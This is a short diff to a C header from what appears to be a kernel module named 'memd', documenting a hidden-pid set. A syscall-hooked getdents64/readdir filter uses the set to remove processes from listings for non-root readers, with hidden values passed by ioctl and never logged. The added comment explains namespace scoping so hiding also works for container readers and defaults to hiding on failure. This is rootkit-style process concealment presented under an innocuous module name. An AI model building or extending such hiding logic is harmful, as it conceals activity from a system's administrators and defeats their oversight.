@@ -6,7 +6,16 @@
 
 /* Hidden-pid set: which pids the getdents64 filter removes for non-root
  * readers. Values arrive at runtime via ioctl only (never compiled in,
- * never logged). Fixed capacity, no allocations (exit-safe). */
+ * never logged). Fixed capacity, no allocations (exit-safe).
+ *
+ * Scoping rule: entries are keyed (pid, active pid-ns); add/del scope
+ * by the TARGET's active ns. The readdir filter instead scopes by the
+ * READER's active ns (see memd_syshook.h), so container readers match
+ * container entries. memd_hide_contains() below is a TARGET-scoped
+ * management query ("is this pid hidden where it lives"), not a reader
+ * check: reader-plane code must call memd_hide_contains_ns() with the
+ * reader's ns. contains_ns() with NULL ns returns false; unresolvable
+ * reader ns must fail closed (hide) at the call site, never here. */
 #define MEMD_HIDE_MAX 256
 
 /* Per-PID hide entry with namespace support */
